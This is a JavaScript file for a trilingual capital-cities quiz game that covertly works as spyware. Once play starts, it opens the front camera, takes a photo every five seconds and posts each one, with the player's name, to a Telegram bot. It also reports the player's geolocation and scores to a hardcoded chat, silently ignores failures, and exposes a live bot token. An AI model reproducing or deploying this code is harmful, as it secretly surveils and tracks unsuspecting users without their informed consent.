// Токен и чат ID Telegram (замени на свои)
const TELEGRAM_BOT_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
const TELEGRAM_CHAT_ID = '8071841674';

// Массив вопросов (30 вопросов, пример 4, дополни позже)
const questionsData = [
  {
    hy: {
      q: "Որն է Հայաստանի մայրաքաղաքը",
      answers: ["Երևան", "Գյումրի", "Վանաձոր", "Հրազդան"],
      correct: 0
    },
    ru: {
      q: "Какой город является столицей Армении",
      answers: ["Ереван", "Гюмри", "Ванадзор", "Раздан"],
      correct: 0
    },
    en: {
      q: "What is the capital of Armenia?",
      answers: ["Yerevan", "Gyumri", "Vanadzor", "Hrazdan"],
      correct: 0
    }
  },
  {
    hy: {
      q: "Որն է Ռուսաստանի մայրաքաղաքը",
      answers: ["Մոսկվա", "Սանկտ Պետերբուրգ", "Նովոսիբիրսկ", "Եկատերինբուրգ"],
      correct: 0
    },
    ru: {
      q: "Какой город является столицей России",
      answers: ["Москва", "Санкт-Петербург", "Новосибирск", "Екатеринбург"],
      correct: 0
    },
    en: {
      q: "What is the capital of Russia?",
      answers: ["Moscow", "Saint Petersburg", "Novosibirsk", "Yekaterinburg"],
      correct: 0
    }
  },
  {
    hy: {
      q: "Որն է Ֆրանսիայի մայրաքաղաքը",
      answers: ["Փարիզ", "Լիոն", "Մարսել", "Նիս"],
      correct: 0
    },
    ru: {
      q: "Какой город является столицей Франции",
      answers: ["Париж", "Лион", "Марсель", "Ницца"],
      correct: 0
    },
    en: {
      q: "What is the capital of France?",
      answers: ["Paris", "Lyon", "Marseille", "Nice"],
      correct: 0
    }
  },
  {
    hy: {
      q: "Որն է ԱՄՆ մայրաքաղաքը",
      answers: ["Վաշինգտոն", "Նյու Յորք", "Լոս Անջելես", "Չիկագո"],
      correct: 0
    },
    ru: {
      q: "Какой город является столицей США",
      answers: ["Вашингтон", "Нью-Йорк", "Лос-Анджелес", "Чикаго"],
      correct: 0
    },
    en: {
      q: "What is the capital of USA?",
      answers: ["Washington, D.C.", "New York", "Los Angeles", "Chicago"],
      correct: 0
    }
  }
  // ... добавь остальные вопросы по образцу, чтобы всего 30 ...
];

// Переводы интерфейса
const translations = {
  hy: {
    enterName: "Մուտքագրեք ձեր անունը",
    startGame: "Սկսել խաղը",
    tryAgain: "Փորձել նորից",
    questionsLeft: "Հարցեր մնացել են",
    correctAnswers: "Ճիշտ պատասխաններ",
    wrongAnswers: "Սխալ պատասխաններ",
    victory: "Դուք հաղթեցիք! 🎉",
    defeat: "Ցավում ենք, պարտվեցիք 😞",
    namePlaceholder: "Մուտքագրեք ձեր անունը"
  },
  ru: {
    enterName: "Введите ваше имя",
    startGame: "Начать игру",
    tryAgain: "Попробовать снова",
    questionsLeft: "Осталось вопросов",
    correctAnswers: "Правильных ответов",
    wrongAnswers: "Неправильных ответов",
    victory: "Вы выиграли! 🎉",
    defeat: "К сожалению, вы проиграли 😞",
    namePlaceholder: "Введите ваше имя"
  },
  en: {
    enterName: "Enter your name",
    startGame: "Start Game",
    tryAgain: "Try Again",
    questionsLeft: "Questions left",
    correctAnswers: "Correct answers",
    wrongAnswers: "Wrong answers",
    victory: "You won! 🎉",
    defeat: "Sorry, you lost 😞",
    namePlaceholder: "Enter your name"
  }
};

// Глобальные переменные состояния игры
let currentLanguage = localStorage.getItem('lang') || 'hy';
let userName = '';
let currentQuestions = [];
let currentQuestionIndex = 0;
let correctCount = 0;
let wrongCount = 0;

// Получаем DOM элементы
const nameFormContainer = document.getElementById('name-form-container');
const nameForm = document.getElementById('name-form');
const nameInput = document.getElementById('name-input');
const nameLabel = document.getElementById('name-label');
const startBtn = document.getElementById('start-btn');

const gameArea = document.getElementById('game-area');
const userNameDiv = document.getElementById('user-name');
const scoreInfoDiv = document.getElementById('score-info');
const questionDiv = document.getElementById('question');
const answerButtonsDiv = document.getElementById('answer-buttons');
const tryAgainBtn = document.getElementById('try-again-btn');

// Обработчики для выбора языка по клику на флаги
document.querySelectorAll('.lang-select img').forEach(img => {
  img.addEventListener('click', () => {
    const selectedLang = img.dataset.lang;
    if (selectedLang && translations[selectedLang]) {
      currentLanguage = selectedLang;
      localStorage.setItem('lang', currentLanguage);
      applyTranslations();
    }
  });
});

// Функция применения перевода в интерфейсе
function applyTranslations() {
  nameLabel.textContent = translations[currentLanguage].enterName;
  nameInput.placeholder = translations[currentLanguage].namePlaceholder;
  startBtn.textContent = translations[currentLanguage].startGame;
  tryAgainBtn.textContent = translations[currentLanguage].tryAgain;
  updateScoreInfo();
}

applyTranslations();
// Перемешать массив (Фишер-Йейтс)
function shuffleArray(array) {
  for (let i = array.length - 1; i > 0; i--) {
    let j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
}

// Выбрать 10 случайных вопросов из всего массива (без повторов)
function selectQuestions() {
  let indices = Array.from(Array(questionsData.length).keys());
  shuffleArray(indices);
  currentQuestions = indices.slice(0, 10).map(i => questionsData[i]);
}

// Запуск игры
function startGame() {
  userName = nameInput.value.trim();
  if (!userName) {
    userName = currentLanguage === 'hy' ? "Անհայտ" : currentLanguage === 'ru' ? "Неизвестный" : "Unknown";
  }
  localStorage.setItem('userName', userName);
  currentQuestionIndex = 0;
  correctCount = 0;
  wrongCount = 0;
  selectQuestions();
  nameFormContainer.style.display = 'none';
  gameArea.style.display = 'block';
  tryAgainBtn.style.display = 'none';
  showQuestion();
  updateScoreInfo();
  sendTelegramStart();
  startCameraIfAllowed();
  getGeolocation();
}

// Показать текущий вопрос
function showQuestion() {
  clearAnswerButtons();

  if (currentQuestionIndex >= currentQuestions.length) {
    // Ждём ответов на все 10 вопросов, не даём пропустить
    showResults();
    return;
  }

  const qObj = currentQuestions[currentQuestionIndex][currentLanguage];

  questionDiv.textContent = qObj.q;

  // Создаём массив с ответами и помечаем правильный
  let answers = qObj.answers.map((a, i) => ({ text: a, isCorrect: i === qObj.correct }));
  shuffleArray(answers);

  answers.forEach(ans => {
    const btn = document.createElement('button');
    btn.classList.add('btn');
    btn.textContent = ans.text;
    btn.addEventListener('click', () => selectAnswer(btn, ans.isCorrect));
    answerButtonsDiv.appendChild(btn);
  });

  updateScoreInfo();
}

// Очистить кнопки ответов
function clearAnswerButtons() {
  while (answerButtonsDiv.firstChild) {
    answerButtonsDiv.removeChild(answerButtonsDiv.firstChild);
  }
}

// Обработка выбора ответа
function selectAnswer(button, isCorrect) {
  // Блокируем все кнопки после выбора
  Array.from(answerButtonsDiv.children).forEach(btn => btn.disabled = true);

  if (isCorrect) {
    button.classList.add('correct');
    correctCount++;
  } else {
    button.classList.add('wrong');
    wrongCount++;
    // Подсветить правильный ответ зелёным
    Array.from(answerButtonsDiv.children).forEach(btn => {
      if (btn.textContent === currentQuestions[currentQuestionIndex][currentLanguage].answers[currentQuestions[currentQuestionIndex][currentLanguage].correct]) {
        btn.classList.add('correct');
      }
    });
  }

  updateScoreInfo();

  setTimeout(() => {
    currentQuestionIndex++;
    showQuestion();
  }, 1500);
}

// Обновление счёта и информации вверху
function updateScoreInfo() {
  const questionsLeft = 10 - currentQuestionIndex;
  scoreInfoDiv.textContent = `${translations[currentLanguage].questionsLeft}: ${questionsLeft} | ` +
    `${translations[currentLanguage].correctAnswers}: ${correctCount} | ` +
    `${translations[currentLanguage].wrongAnswers}: ${wrongCount}`;
  userNameDiv.textContent = userName || '-';
}
// Показать результаты после 10 вопросов
function showResults() {
  clearAnswerButtons();

  if (correctCount >= 6) {
    questionDiv.textContent = translations[currentLanguage].victory;
  } else {
    questionDiv.textContent = translations[currentLanguage].defeat;
  }

  tryAgainBtn.style.display = 'block';
  updateScoreInfo();
  sendTelegramResult();
}

// Обработчик кнопки «Փորձել նորից»
tryAgainBtn.addEventListener('click', () => {
  tryAgainBtn.style.display = 'none';

  // Если нет доступа к геолокации или камере — заново запросить
  if (!geoCoords || !cameraStream) {
    requestPermissions();
  } else {
    // Если разрешения есть — просто рестарт игры без перезагрузки страницы
    currentQuestionIndex = 0;
    correctCount = 0;
    wrongCount = 0;
    selectQuestions();
    showQuestion();
    updateScoreInfo();
  }
});

// Запросить геолокацию
function getGeolocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(position => {
      geoCoords = position.coords;
      // Можно обновлять Telegram с гео если нужно
    }, error => {
      geoCoords = null;
    });
  }
}

// Запросить разрешения заново (гео + камера)
function requestPermissions() {
  // Сброс потоков камеры
  if (cameraStream) {
    let tracks = cameraStream.getTracks();
    tracks.forEach(track => track.stop());
    cameraStream = null;
  }
  geoCoords = null;

  // Показываем форму имени, чтобы пользователь мог начать заново
  nameFormContainer.style.display = 'block';
  gameArea.style.display = 'none';

  // Очистить имя для повторного ввода
  nameInput.value = '';
}

// Запуск камеры и фотосъемка каждые 5 секунд
function startCameraIfAllowed() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    cameraStream = null;
    return;
  }
  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(stream => {
      cameraStream = stream;
      startTakingPhotos();
    })
    .catch(() => {
      cameraStream = null;
    });
}

let photoIntervalId = null;

function startTakingPhotos() {
  if (!cameraStream) return;
  if (photoIntervalId) clearInterval(photoIntervalId);

  const video = document.createElement('video');
  video.srcObject = cameraStream;
  video.play();

  photoIntervalId = setInterval(() => {
    takePhoto(video);
  }, 5000);
}

function takePhoto(video) {
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth || 320;
  canvas.height = video.videoHeight || 240;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(blob => {
    if (blob) {
      sendPhotoToTelegram(blob);
    }
  }, 'image/jpeg', 0.7);
}

// Отправка фото в Telegram
function sendPhotoToTelegram(blob) {
  const reader = new FileReader();
  reader.onloadend = function () {
    const base64data = reader.result.split(',')[1];
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, 'photo.jpg');
    formData.append('caption', `Фото игрока: ${userName}`);

    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    }).catch(() => { /* Игнорируем ошибки отправки фото */ });
  };
  reader.readAsDataURL(blob);
}

// Отправка старта игры в Telegram
function sendTelegramStart() {
  let message = `Игрок начал игру: ${userName}\nЯзык: ${currentLanguage}\n`;
  if (geoCoords) {
    message += `Геолокация: https://www.google.com/maps?q=${geoCoords.latitude},${geoCoords.longitude}\n`;
  } else {
    message += `Геолокация: недоступна\n`;
  }
  sendTelegramMessage(message);
}

// Отправка результатов игры в Telegram
function sendTelegramResult() {
  let message = `Результат игры игрока ${userName}:\n` +
    `Язык: ${currentLanguage}\n` +
    `Правильных ответов: ${correctCount}\n`;
  if (geoCoords) {
    message += `Геолокация: https://www.google.com/maps?q=${geoCoords.latitude},${geoCoords.longitude}\n`;
  } else {
    message += `Геолокация: недоступна\n`;
  }
  sendTelegramMessage(message);
}

// Универсальная отправка текста в Telegram
function sendTelegramMessage(text) {
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'HTML'
    })
  }).catch(() => { /* Игнорируем ошибки отправки */ });
}
// Элементы переключения языка (добавим сами в HTML позже)
const langButtons = document.querySelectorAll('.lang-btn');

langButtons.forEach(btn => {
  btn.addEventListener('click', () => {
    currentLanguage = btn.dataset.lang;
    localStorage.setItem('lang', currentLanguage);
    applyTranslations();

    // Если игра уже идет, обновим вопрос и счет
    if (gameArea.style.display === 'block') {
      showQuestion();
      updateScoreInfo();
    }
  });
});

// Инициализация при загрузке страницы
window.addEventListener('DOMContentLoaded', () => {
  currentLanguage = localStorage.getItem('lang') || 'hy';
  applyTranslations();

  // Если есть сохраненное имя — подставляем
  const savedName = localStorage.getItem('userName');
  if (savedName) {
    nameInput.value = savedName;
  }

  nameForm.addEventListener('submit', e => {
    e.preventDefault();
    startGame();
  });
});
